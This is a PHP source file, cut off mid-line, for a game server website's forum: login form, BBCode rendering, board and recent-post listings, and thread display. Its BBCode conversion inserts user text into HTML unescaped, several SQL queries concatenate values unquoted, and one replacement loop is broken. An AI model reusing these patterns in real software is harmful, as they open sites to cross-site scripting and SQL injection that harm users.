<?PHP
//#/#//#/#/ FORUM CONFIGURATION /#/#//#/#//
$level_limit = 8; //// --> CHARACTER LEVEL TO POST REPLY/THREAD <--
$post_interval = 60; //--> INTERVAL BETWEEN POSTS <--
$group_not_blocked = 1; // --> GROUP OF PLAYER THAT CAN ALWAYS POST <--
$posts_per_page = 10; // --> POSTS THAT WOULD BE SHOWED PER THREAD <--
$threads_per_page = 10; // --> THREADS THAT WOULD BE SHOWED PER PAGE <--
$sections = array(1 => 'Latest News',2 => 'Help',3 => 'Quests',4 => 'Media',5 => 'Propositions',6 => 'Trade Board',7 => 'Guides',8 => 'Hot News',9 => 'Staff',);
$sections_desc = array(1 => 'Latest news about the changes, information from our server.',2 => 'Need help? Ask your questions here.',3 => 'Are you looking for a team to deal with great monsters, that you can not beat yourself? Ask here, and find a team.',4 => 'Have you created an movie or a screenshot of you or your team playing our server? Share it with us here.',5 => 'Got a nice idea for our server? Feel free to post it here!',6 => 'Hold auctions to sell your items, buy or change for something you need.',7 => 'Have you created a nice guide related with our server? Feel free to share it with us!',8 => 'Worldwide hottest news. Feel free to share your off-game latest news',9 => 'This section is devoted to the discussion about our Staff.');
$main_content .= '<style type="text/css"><!-- .Style1 {color: black}.Header {color: black;font-size: small}.SubHeader {color: white;font-size: x-small}.Short {font-size: x-small}.Style2 {color: white} -->.bordaBox {background: ttransparent; width:30%; width: 100%;}.bordaBox .b1, .bordaBox .b2, .bordaBox .b3, .bordaBox .b4, .bordaBox .b1b, .bordaBox .b2b, .bordaBox .b3b, .bordaBox .b4b {display:block; overflow:hidden; font-size:1px;}.bordaBox .b1, .bordaBox .b2, .bordaBox .b3, .bordaBox .b1b, .bordaBox .b2b, .bordaBox .b3b {height:1px;}.bordaBox .b2, .bordaBox .b3, .bordaBox .b4 {background:#fbff94; border-left:1px dotted '.$config['site']['vdarkborder'].'; border-right:1px dotted '.$config['site']['vdarkborder'].';}.bordaBox .conteudo {padding:5px;display:block; background:#fbff94; border-left:1px dotted '.$config['site']['vdarkborder'].'; border-right:1px dotted '.$config['site']['vdarkborder'].';}</style>';
//#/#//#/#/ END CONFIGURATION /#/#//#/#//

if($action == 'login')
{
	if($_REQUEST['redirect'] == 'forum' || $_REQUEST['redirect'] == 'forums')
		$redirect = $_REQUEST['redirect'];
	if(!$logged)
		$main_content .= 'Please enter your account number and your password.<br/><a href="?subtopic=createaccount" >Create an account</a> if you do not have one yet.<br/><br/><form action="?subtopic=forum&action=login&redirect='.$redirect.'" method="post" ><div class="TableContainer" >  <table class="Table1" cellpadding="0" cellspacing="0" >    <div class="CaptionContainer" >      <div class="CaptionInnerContainer" >        <span class="CaptionEdgeLeftTop" style="background-image:url('.$layout_name.'/images/content/box-frame-edge.gif);" /></span>        <span class="CaptionEdgeRightTop" style="background-image:url('.$layout_name.'/images/content/box-frame-edge.gif);" /></span>        <span class="CaptionBorderTop" style="background-image:url('.$layout_name.'/images/content/table-headline-border.gif);" ></span>        <span class="CaptionVerticalLeft" style="background-image:url('.$layout_name.'/images/content/box-frame-vertical.gif);" /></span>        <div class="Text" >Account Login</div>        <span class="CaptionVerticalRight" style="background-image:url('.$layout_name.'/images/content/box-frame-vertical.gif);" /></span>        <span class="CaptionBorderBottom" style="background-image:url('.$layout_name.'/images/content/table-headline-border.gif);" ></span>        <span class="CaptionEdgeLeftBottom" style="background-image:url('.$layout_name.'/images/content/box-frame-edge.gif);" /></span>        <span class="CaptionEdgeRightBottom" style="background-image:url('.$layout_name.'/images/content/box-frame-edge.gif);" /></span>      </div>    </div>    <tr>      <td>        <div class="InnerTableContainer" >          <table style="width:100%;" ><tr><td class="LabelV" ><span >Account Number:</span></td><td style="width:100%;" ><input type="password" name="account_login" SIZE="10" maxlength="10" ></td></tr><tr><td class="LabelV" ><span >Password:</span></td><td><input type="password" name="password_login" size="30" maxlength="29" ></td></tr>          </table>        </div>  </table></div></td></tr><br/><table width="100%" ><tr align="center" ><td><table border="0" cellspacing="0" cellpadding="0" ><tr><td style="border:0px;" ><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)" ><div onMouseOver="MouseOverBigButton(this);" onMouseOut="MouseOutBigButton(this);" ><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);" ></div><input class="ButtonText" type="image" name="Submit" alt="Submit" src="'.$layout_name.'/images/buttons/_sbutton_submit.gif" ></div></div></td><tr></form></table></td><td><table border="0" cellspacing="0" cellpadding="0" ><form action="?subtopic=lostaccount" method="post" ><tr><td style="border:0px;" ><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)" ><div onMouseOver="MouseOverBigButton(this);" onMouseOut="MouseOutBigButton(this);" ><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);" ></div><input class="ButtonText" type="image" name="Account lost?" alt="Account lost?" src="'.$layout_name.'/images/buttons/_sbutton_accountlost.gif" ></div></div></td></tr></form></table></td></tr></table>';
	else
	{
		$main_content .= '<center><h3>Now you are logged. Redirecting...</h3></center>';
		if($redirect == 'forum')
			header("Location: index.php?subtopic=forum");
		elseif($redirect == 'forums')
			header("Location: index.php?subtopic=forums");
		else
			$main_content .= 'Wrong address to redirect!';
	}
}


function canPost($account)
{
    if($account->isLoaded())
        if(!$account->isBanned())
        {
            $SQL = $GLOBALS['SQL'];
            $level_limit = $GLOBALS['level_limit'];
            $player = $SQL->query("SELECT `level` FROM `players` WHERE `account_id` = ".$SQL->quote($account->getId())." ORDER BY `level` DESC")->fetch();
            if($player['level'] >= $level_limit)
                return true;
        }
    return false;
}

function replaceSmile($text, $smile)
{
    $smileys = array(':foreveralone:' => 67, ':troll:' => 66,';D' => 1, ':D' => 1, ':cool:' => 2, ';cool;' => 2, ':eek:' => 3, ':what:' => 3, ';o' => 4, ';O' => 4, ':o' => 4, ':O' => 4, ':(' => 5, ';(' => 5, ':mad:' => 6, ';mad;' => 6, ';rolleyes;' => 7, ':rolleyes:' => 7, ':)' => 8, ';d' => 9, ':d' => 9, ';)' => 10, '(y)' => 18, '(n)' => 20, ';arrow;' => 19, ':arrow:' => 19, '(?)' => 21, '(l)' => 22, '(6)' => 16, 'M:' => 14);
    if($smile == 1)
        return $text;
    else
    {
        foreach($smileys as $search => $replace)
            $text = str_replace($search, '<img src="images/smile/'.$replace.'.gif" alt="'.$smileys.'"/>', $text);
        return $text;
    }
}

function replaceAll($text, $smile)
{
    $rows = 0;
    while(stripos($text, '[code]') !== false && stripos($text, '[/code]') !== false )
    {
        $code = substr($text, stripos($text, '[code]')+6, stripos($text, '[/code]') - stripos($text, '[code]') - 6);
        if(!is_int($rows / 2)) { $bgcolor = 'fbff94'; } else { $bgcolor = 'fbff94'; } $rows++;
        $text = str_ireplace('[code]'.$code.'[/code]', '<i>Code:</i><br/><table cellpadding="0" style="background-color: #'.$bgcolor.'; width: 480px; border-style: dotted; border-color: '.$config['site']['vdarkborder'].'; border-width: 2px"><tr><td>'.$code.'</td></tr></table>', $text);
    }
   $rows = 0;
    while(stripos($text, '[quote]') !== false && stripos($text, '[/quote]') !== false )
    {
        $quote = substr($text, stripos($text, '[quote]')+7, stripos($text, '[/quote]') - stripos($text, '[quote]') - 7);
        if(!is_int($rows / 2)) { $bgcolor = 'AAAAAA'; } else { $bgcolor = 'CCCCCC'; } $rows++;
        $text = str_ireplace('[quote]'.$quote.'[/quote]', '<div class="bordaBox"><b class="b1"></b><b class="b2"></b><b class="b3"></b><b class="b4"></b><div class="conteudo">'.$quote.'</div><b class="b4"></b><b class="b3"></b><b class="b2"></b><b class="b1"></b></div>', $text);
    }
    $rows = 0;
    while(stripos($text, '[url]') !== false && stripos($text, '[/url]') !== false )
    {
        $url = substr($text, stripos($text, '[url]')+5, stripos($text, '[/url]') - stripos($text, '[url]') - 5);
        $text = str_ireplace('[url]'.$url.'[/url]', '<a href="http://'.$url.'" target="_blank">'.$url.'</a>', $text);
    }
    while(stripos($text, '[player]') !== false && stripos($text, '[/player]') !== false )
    {
        $player = substr($text, stripos($text, '[player]')+8, stripos($text, '[/player]') - stripos($text, '[player]') - 8);
        $text = str_ireplace('[player]'.$player.'[/player]', '<a href="?subtopic=characters&name='.urlencode($player).'">'.$player.'</a>', $text);
    }
    while(stripos($text, '[img]') !== false && stripos($text, '[/img]') !== false )
    {
        $img = substr($text, stripos($text, '[img]')+5, stripos($text, '[/img]') - stripos($text, '[img]') - 5);
        $text = str_ireplace('[img]'.$img.'[/img]', '<img src="'.$img.'">', $text);
    }
    while(stripos($text, '[b]') !== false && stripos($text, '[/b]') !== false )
    {
        $b = substr($text, stripos($text, '[b]')+3, stripos($text, '[/b]') - stripos($text, '[b]') - 3);
        $text = str_ireplace('[b]'.$b.'[/b]', '<b>'.$b.'</b>', $text);
    }
    while(stripos($text, '[i]') !== false && stripos($text, '[/i]') !== false )
    {
        $i = substr($text, stripos($text, '[i]')+3, stripos($text, '[/i]') - stripos($text, '[i]') - 3);
        $text = str_ireplace('[i]'.$i.'[/i]', '<i>'.$i.'</i>', $text);
    }
    while(stripos($text, '[u]') !== false && stripos($text, '[/u]') !== false )
    {
        $u = substr($text, stripos($text, '[u]')+3, stripos($text, '[/u]') - stripos($text, '[u]') - 3);
        $text = str_ireplace('[u]'.$u.'[/u]', '<u>'.$u.'</u>', $text);
    }
	while(stripos($text, '<div>') !== false && stripos($text, '<div>') !== false )
    {
        $e = substr($text, stripos($text, 'e')+3, stripos($text, 'e') - stripos($text, 'e') - 3);
        $text = str_ireplace('e'.$e.'e', '<div>'.$e.'<div>', $text);
    }
	while(stripos($text, '[youtube]') !== false && stripos($text, '[/youtube]') !== false )
    {
        $youtube = substr($text, stripos($text, '[youtube]')+9, stripos($text, '[/youtube]') - stripos($text, '[youtube]') - 9);
        $text = str_ireplace('[youtube]'.$youtube.'[/youtube]', '<object width="425" height="350"><param name="movie" value="http://www.youtube.com/v/'.$youtube.'"></param><embed src="http://www.youtube.com/v/'.$youtube.'" type="application/x-shockwave-flash" width="485" height="350"></embed></object>', $text);
    }
	return replaceSmile($text, $smile);
}
	function delete_directory($dirname) {
    if (is_dir($dirname))
        $dir_handle = opendir($dirname);
    if (!$dir_handle)
        return false;
    while($file = readdir($dir_handle)) {
        if ($file != "." && $file != "..") {
            if (!is_dir($dirname."/".$file))
                unlink($dirname."/".$file);
            else
                delete_directory($dirname.'/'.$file);          
        }
    }
    closedir($dir_handle);
		rmdir($dirname);
		return true;
	}
function codeLower($text)
{
    return str_ireplace(array('[b]', '[i]', '[u]', '[/u][/i][/b][i][u]', '[/u][/i][u]', '[/u]', '[url]', '[player]', '[img]', '[code]', '[quote]', '[/quote][/code][/url][code][quote]', '[/player]', '[/img]', '[/quote][/code][quote]', '[/quote]'), array('[b]', '[i]', '[u]', '[/u][/i][/b][i][u]', '[/u][/i][u]', '[/u]', '[url]', '[player]', '[img]', '[code]', '[quote]', '[/quote][/code][/url][code][quote]', '[/player]', '[/img]', '[/quote][/code][quote]', '[/quote]'), $text);
}

function isThreadOpen($thread)
{
            $SQL = $GLOBALS['SQL'];
$closed = $SQL->query( 'SELECT `closed` FROM `z_forum` WHERE `id` = '.$thread.';' )->fetch( );
        if($closed['closed'] == 0)
        {
        return true;
        }
    return false;
}

function showPost($topic, $text, $smile)
{
    $text = nl2br($text);
    $post = '';
    if(!empty($topic))
        $post .= '<b>'.replaceSmile($topic, $smile).'</b><hr />';
    $post .= replaceAll($text, $smile);
    return $post;
}
if($action == '')
{
if(!$logged)
    $main_content .=  '<table width="100%"><tr><td align="right"><form action="?subtopic=forum&action=login&redirect=forum" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" name="Login" alt="Login" src="'.$layout_name.'/images/buttons/_sbutton_login_default.gif"></div></div></form></td><td align="center"> You are not logged in any account. You must be logged in, to post on the Forum.</td></tr></table><br/><br/>';
	$main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td><table width="100%"><tr><td align="left"><b><font color="#262b26" size="1">Navigator:</font></font> <font color="white" size="1"><b> Boards</b></font></td><td align="right"><font color="white" size="1"><a href="?subtopic=forum&action=recent_posts"><b>Lastest Posts <img src="images/logo_oldpost.gif" title="Post Date"/></b></a></font></td></tr></table></td></tr></table><br/>';
    $main_content .= '
	<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;">
	<tr bgcolor="#3c3c3c">
		<td height="28"></td>
		<td height="28" colspan="3">
			<table width="100%">
				<tbody>
					<tr><td><font color="white" size="1"><b>Board</b></font></td></tr>
				</tbody>
			</table>
		</td>
		<td>
			<table width="100%">
				<tbody>
					<tr><td><font color="white" size="1"><b>Last Post</b></font></td></tr>
				</tbody>
			</table>
		</td>
	</tr>';
	$info = $SQL->query("SELECT `section`, COUNT(`id`) AS 'threads', SUM(`replies`) AS 'replies' FROM `z_forum` WHERE `first_post` = `id` GROUP BY `section`")->fetchAll();
    foreach($info as $data)
        $counters[$data['section']] = array('threads' => $data['threads'], 'posts' => $data['replies'] + $data['threads']);
    foreach($sections as $id => $section)
    {
        $last_post = $SQL->query("SELECT `players`.`name`, `z_forum`.`post_date` FROM `players`, `z_forum` WHERE `z_forum`.`section` = ".(int) $id." AND `players`.`id` = `z_forum`.`author_guid` ORDER BY `post_date` DESC LIMIT 1")->fetch();
        if(!is_int($number_of_rows / 2)) { $bgcolor = $config['site']['darkborder']; } else { $bgcolor = $config['site']['lightborder']; } $number_of_rows++;
        $main_content .= '
			<tr bgcolor="'.$bgcolor.'">
				<td>
					<table width="100%"><tbody>
						<tr><td>
							<img src="images/icon2.png" width="32" height="32" class="classBlock"/>
						</td></tr>
					</tbody></table>
				</td>
				<td>
					<table width="100%"><tbody>
						<tr><td>
							<a href="?subtopic=forum&action=show_board&id='.$id.'">'.$section.'</a><br /><small>'.$sections_desc[$id].'</small>
						</td></tr>
					</tbody></table>
				</td>
				<td colspan="2" width="90">
					<table width="100%"><tbody>
						<tr><td>
							<small>Threads: '.(int) $counters[$id]['posts'].'</br>Posts: '.(int) $counters[$id]['threads'].'</small>
						</td></tr>
					</tbody></table>
				</td>
				
					<td width="180">
					<table width="100%"><tbody><tr><td>';
		if(isset($last_post['name']))
            $main_content .= '<small><img src="images/logo_lastpost.gif"/> '.date('d.m.y H:i:s', $last_post['post_date']).'<br />by <a href="?subtopic=characters&name='.urlencode($last_post['name']).'">'.$last_post['name'].'</a></small>';
        else
            $main_content .= '<center><small>No Threads in this Board</small></center>';
        $main_content .= '</td></tr></tbody></table></td></tr>';
	}
    $main_content .= '<tr bgcolor="#3c3c3c" width="100%"><td height="15" colspan="5" align="right"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Current Time: '.date("j F Y, G:i:s").'<b></font></td></tr></tbody></table></td></tr></table>';
}
####################################################
      //Latest Posts - Function by Gabriel//
####################################################
if($action == 'recent_posts')
{
$main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td><table width="100%"><tr><td align="left"><b><font color="#262b26" size="1">Navigator:</font></font> <font color="white" size="1"><b> <a href="index.php?subtopic=forum">Boards</a> � Latest Posts</b></font></td></tr></table></td></tr></table><br/>';
    $main_content .= '<table width="100%" border="0" cellpadding="0" cellspacing="1"><tr bgcolor="'.$config['site']['vdarkborder'].'" align="left"><td height="26"><font color="white" size="1"><b> Thread</b></font></td><td align="center"><font color="white" size="1"><b>Last Post</b></font></td><td align="center" width="50"><font color="white" size="1"><b>Replies</b></font></td><td align="center" width="50"><font color="white" size="1"><b>Views</b></font></td><td align="center"><font color="white" size="1"><b>Forum</b></font></td></tr>';

$order = 0;
$posts = $SQL->query('SELECT id,first_post,post_topic,post_date,author_guid,post_text,section FROM z_forum ORDER BY post_date DESC LIMIT 40;');

foreach($posts as $post) {
$order++;
if(is_int($order / 2))
            $bgcolor = $config['site']['darkborder'];
        else
            $bgcolor = $config['site']['lightborder'];

$_name = $SQL->query('SELECT `name` FROM `players` WHERE `id` = '.$post['author_guid'].'')->fetch();
$_replies = $SQL->query('SELECT `replies` FROM `z_forum` WHERE `first_post` = '.$post['first_post'].'')->fetch();
$_views = $SQL->query('SELECT `views` FROM `z_forum` WHERE `first_post` = '.$post['first_post'].'')->fetch();
$_text = $post['post_text'];
$_thread = $SQL->query('SELECT `post_topic` FROM `z_forum` WHERE `first_post` = '.$post['first_post'].'')->fetch();
if (strlen($_thread[0]) > 50) //Char Limit Config for the Threads
    $_thread[0] = substr($_thread[0], 0, strrpos(substr($_thread[0], 0, 50), ' ')) . '...';
if (strlen($_text) > 50) //Char Limit Config for the Posts
    $_text = substr($_text, 0, strrpos(substr($_text, 0, 50), ' ')) . '...';

$main_content .= '<tr bgcolor="'.$bgcolor.'">
<td><img src="images/multipage.gif"> "'.$_text.'"</span><br/><img src="images/firstnew.gif"><b><a href="?subtopic=forum&action=show_thread&id='.urlencode($post['first_post']).'"><font size="1"><span class="Style1"> '.$_thread[0].'</a></b></span></td>
<td style="text-align: center;"><font size="1"><span class="Style1">'.date("F d (H:m)", $post[post_date]).' <br/>by <strong>'.$_name[0].' </strong></span><a href="?subtopic=forum&action=show_thread&id='.urlencode($post['first_post']).'"><img src="images/lastpost.gif" style="border: none;"></a></td>
<td><center><span class="Style1">'.$_replies[0].'</center></span></td>
<td><center><span class="Style1">'.$_views[0].'</center></span></td>
<td style="text-align: center;"><span class="Short"><b>'.$sections[$post[section]].'</b></span></td></tr>';
    }
$main_content .= '</table>';
}
####################################################>
if($action == 'show_board')

{
if(!$logged)
    $main_content .=  '<table width="100%"><tr><td align="right"><form action="?subtopic=forum&action=login&redirect=forum" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" name="Login" alt="Login" src="'.$layout_name.'/images/buttons/_sbutton_login_default.gif"></div></div></form></td><td align="center"> You are not logged in any account. You must be logged in, to post on the Forum.</td></tr></table><br/><br/>';

    $section_id = (int) $_REQUEST['id'];
    $page = (int) $_REQUEST['page'];
    $threads_count = $SQL->query("SELECT COUNT(`z_forum`.`id`) AS threads_count FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`section` = ".(int) $section_id." AND `z_forum`.`first_post` = `z_forum`.`id`")->fetch();
    for($i = 0; $i < $threads_count['threads_count'] / $threads_per_page; $i++)
    {
        if($i != $page)
            $links_to_pages .= '<a href="?subtopic=forum&action=show_board&id='.$section_id.'&page='.$i.'">'.($i + 1).'</a> ';
        else
            $links_to_pages .= '<b>'.($i + 1).' </b>';
    }
    $main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td><table width="100%"><tr><td align="left"><small><b><font color="#262b26" size="1">Navigator:</font><font color="white" size="1"><a href="?subtopic=forum"> Boards</a> <font size="1">�</font> <b>'.$sections[$section_id].'</b></font></small></td><td align="right"><form action="?subtopic=forum&action=new_topic&section_id='.$section_id.'" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" title="Create New Topic" name="New Topic" alt="New Topic" src="'.$layout_name.'/images/buttons/_sbutton_newtopic.gif"></div></div></form></td></tr></table></td></tr></table><br/>';

    $last_threads = $SQL->query("SELECT * FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`section` = ".(int) $section_id." AND `z_forum`.`first_post` = `z_forum`.`id` ORDER BY `sticky` DESC, `post_date` DESC LIMIT ".$threads_per_page." OFFSET ".($page * $threads_per_page))->fetchAll();  
    if(isset($last_threads[0]))
    {
        $main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="26" width="300"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Thread</b></font></td></tr></tbody></table></td><td height="26"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Thread Starter</b></font></td></tr></tbody></table></td>
		
	<td height="26" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Replies/Views</b></font></td></tr></tbody></table></td>

	
	<td height="26"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Last Post</b></font></td></tr></tbody></table></td></tr>';
        
		foreach($last_threads as $thread)
        {
            if(!is_int($number_of_rows / 2)) { $bgcolor = $config['site']['darkborder']; } else { $bgcolor = $config['site']['lightborder']; } $number_of_rows++;
            $main_content .= '<tr bgcolor="'.$bgcolor.'"><td>';
            $stick = ""; $stix = '<span style="color:blue">[STICK]</span>'; if ( $thread['sticky'] == 1 ) { $stick = '<img src="images/sticky.png" width="32" height="32" style="margin: 1px;" alt="sticky" title="Sticky Thread"/>'; $stix = '<span style="color:orange">[UNSTICK]</span>'; }
			$closed = '<span style="color:purple">[CLOSE]</span>'; if ( $thread['closed'] == 1 ) { $closed = '<span style="color:purple">[OPEN]</span>'; }
			$closedBLOCK = ""; $sblock = '[BLOQUEAR]'; if ( $thread['closed'] == 1 ) { $stick = '<img src="images/closed.gif" alt="closed" title="Closed Thread" style="margin: 7px;"/>'; $sblock = '<span style="color:orange">[DESBLOQUEAR]</span>'; }
			if($logged && $group_id_of_acc_logged >= $group_not_blocked)
                $main_content .= '<a href="?subtopic=forum&action=close_thread&id='.$thread['id'].'")">'.$closed.'</a> <a href="?subtopic=forum&action=stick_post&id='.$thread['id'].'")">'.$stix.'</a> <a href="?subtopic=forum&action=move_thread&id='.$thread['id'].'"\')"><span style="color:darkgreen">[MOVE]</span></a> <a href="?subtopic=forum&action=remove_post&id='.$thread['id'].'" onclick="return confirm(\'Are you sure you want remove thread > '.$thread['post_topic'].' <?\')"><span style="color:red">[REMOVE]</span></a><br/>';
                $main_content .= '<table><tbody><tr><td><b>'.$closedBLOCK.''.$stick.'</b></td><td><a STYLE="text-decoration:none" href="?subtopic=forum&action=show_thread&id='.$thread['id'].'">'.htmlspecialchars($thread['post_topic']).'</a><br/><small>'.htmlspecialchars(substr($thread['post_text'], 0, 50)).'...</small></td></tr></tbody></table></td><td  align="center"><a href="?subtopic=characters&name='.urlencode($thread['name']).'">'.$thread['name'].'</a></td><td colspan="2">				<table width="100%"><tbody><tr><td><small>Replies: '.(int) $thread['replies'].'<br> Views: '.(int) $thread['views'].'</small></td></tr></tbody></table></td><td><table width="100%"><tbody><tr><td>';
            if($thread['last_post'] > 0)
            {
                $last_post = $SQL->query("SELECT `players`.`name`, `z_forum`.`post_date` FROM `players`, `z_forum` WHERE `z_forum`.`first_post` = ".(int) $thread['id']." AND `players`.`id` = `z_forum`.`author_guid` ORDER BY `post_date` DESC LIMIT 1")->fetch();
                if(isset($last_post['name']))
                    $main_content .= '<small><img src="images/logo_lastpost.gif"/> '.date('d.m.y H:i:s', $last_post['post_date']).'<br />by <a href="?subtopic=characters&name='.urlencode($last_post['name']).'">'.$last_post['name'].'</a></small>';
                else
                    $main_content .= 'No Reply Posted.';
            }
            else
                $main_content .= date('d.m.y H:i:s', $thread['post_date']).'<br />by <a href="?subtopic=characters&name='.urlencode($thread['name']).'">'.$thread['name'].'</a>';
            $main_content .= '</td></tr></tbody></table></td></tr>';
        }
        $main_content .= '<tr bgcolor="#3c3c3c" width="100%"><td height="15" colspan="5" align="right"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Current Time: '.date("j F Y, G:i:s").'<b></font></td></tr></tbody></table></td></tr></table><br/><form action="?subtopic=forum&action=new_topic&section_id='.$section_id.'" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" title="Create New Topic" name="New Topic" alt="New Topic" src="'.$layout_name.'/images/buttons/_sbutton_newtopic.gif"></div></div></form>';
		$main_content .= '<table width="100%" border="0"><tr><td align="center">Page: '.$links_to_pages.'</td></tr></table> ';
   }
    else
        $main_content .= '<table cellspacing="0" width="100%" style="background-color:#3c3c3c; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c" align="center"><td height="26" width="300"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Thread</b></font></td></tr></tbody></table></td><td height="26"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Thread Starter</b></font></td></tr></tbody></table></td><td height="26"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Replies</b></font></td></tr></tbody></table></td><td height="26"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Views</b></font></td></tr></tbody></table></td><td height="26"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Last Post</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'" width="100%"><td height="25" colspan="5" align="center">No threads in this board.</td></tr></table>';
}

if($action  == 'show_thread') 
{ if(!$logged)
    $main_content .=  '<table width="100%"><tr><td align="right"><form action="?subtopic=forum&action=login&redirect=forum" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div onmouseover="MouseOverBigButton(this);" onmouseout="MouseOutBigButton(this);"><div class="BigButtonOver" style="background-image:url('.$layout_name.'/images/buttons/sbutton_over.gif);"></div><input class="ButtonText" type="image" name="Login" alt="Login" src="'.$layout_name.'/images/buttons/_sbutton_login_default.gif"></div></div></form></td><td align="center"> You are not logged in any account. You must be logged in, to post on the Forum.</td></tr></table><br/><br/>';

    $thread_id = (int) $_REQUEST['id']; 
    $page = (int) $_REQUEST['page']; 
    $thread_name = $SQL->query("SELECT `players`.`name`, `z_forum`.`post_topic` FROM `players`, `z_forum` WHERE `z_forum`.`first_post` = ".(int) $thread_id." AND `z_forum`.`id` = `z_forum`.`first_post` AND `players`.`id` = `z_forum`.`author_guid` LIMIT 1")->fetch(); 
    if(!empty($thread_name['name'])) 
    { 
        $posts_count = $SQL->query("SELECT COUNT(`z_forum`.`id`) AS posts_count FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`first_post` = ".(int) $thread_id)->fetch(); 
        for($i = 0; $i < $posts_count['posts_count'] / $threads_per_page; $i++) 
        { 
            if($i != $page) 
                $links_to_pages .= '<a style="color: white;" href="?subtopic=forum&action=show_thread&id='.$thread_id.'&page='.$i.'">'.($i + 1).'</a> '; 
            else 
                $links_to_pages .= '<b>'.($i + 1).' </b>'; 
        } 
        $threads = $SQL->query("SELECT `players`.`name`, `players`.`group_id`, `players`.`account_id`, `players`.`world_id`, `players`.`rank_id`, `players`.`vocation`, `players`.`promotion`, `players`.`level`, `z_forum`.`id`,`z_forum`.`first_post`, `z_forum`.`section`,`z_forum`.`post_text`, `z_forum`.`post_topic`, `z_forum`.`post_date`, `z_forum`.`post_smile`, `z_forum`.`author_aid`, `z_forum`.`author_guid`, `z_forum`.`last_edit_aid`, `z_forum`.`edit_date` FROM `players`, `z_forum` WHERE `players`.`id` = `z_forum`.`author_guid` AND `z_forum`.`first_post` = ".(int) $thread_id." ORDER BY `z_forum`.`post_date` LIMIT ".$posts_per_page." OFFSET ".($page * $posts_per_page))->fetchAll(); 
        if(isset($threads[0]['name'])) 
        
		$SQL->query("UPDATE `z_forum` SET `views`=`views`+1 WHERE `id` = ".(int) $thread_id); 
		
		$main_content .= '<table cellspacing="1" width="100%" style="background-color:'.$config['site']['vdarkborder'].'; border: 1px solid #3c3c3c;"><tr bgcolor="#3c3c3c"><td height="16" colspan="2"><table width="100%"><tbody><tr><td><font color="white" size="1"><b>Forum Information</b></font></td></tr></tbody></table></td></tr><tr bgcolor="'.$config['site']['darkborder'].'"><td><table width="100%"><tr><td align="left"><small><b><font color="#262b26" size="1">Navigator:</font><font color="white" size="1"><a href="?subtopic=forum"> Boards</a></font> <font color="#262b26">�</font> <font size="1"><a href="?subtopic=forum&action=show_board&id='.$threads[0]['section'].'"><b>'.$sections[$threads[0]['section']].'</b></a> <font color="white"size="1">�<b> '.$thread_name['post_topic'].'</b></font></small></td><td align="right"><form action="?subtopic=forum&action=new_post&thread_id='.$thread_id.'" method="post" style="padding:0px;margin:0px;"><div class="BigButton" style="background-image:url('.$layout_name.'/images/buttons/sbutton.gif)"><div 